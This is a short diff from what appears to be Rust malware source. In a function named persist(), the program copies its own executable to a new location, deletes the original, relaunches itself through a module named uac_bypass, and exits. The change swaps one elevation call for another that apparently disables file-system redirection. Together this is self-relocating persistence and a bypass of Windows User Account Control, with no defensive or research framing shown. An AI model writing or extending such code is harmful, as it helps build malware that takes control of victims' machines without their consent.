@@ -26,7 +26,7 @@ pub fn persist() -> std::io::Result<()> {
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
         fs::remove_file(&current_exe)?;
-        uac_bypass::elevate_uac(&target_path.to_string_lossy().to_string());
+        uac_bypass::launch_with_fsr_disabled(&target_path.to_string_lossy().to_string())?;
         std::process::exit(0);
     }
 
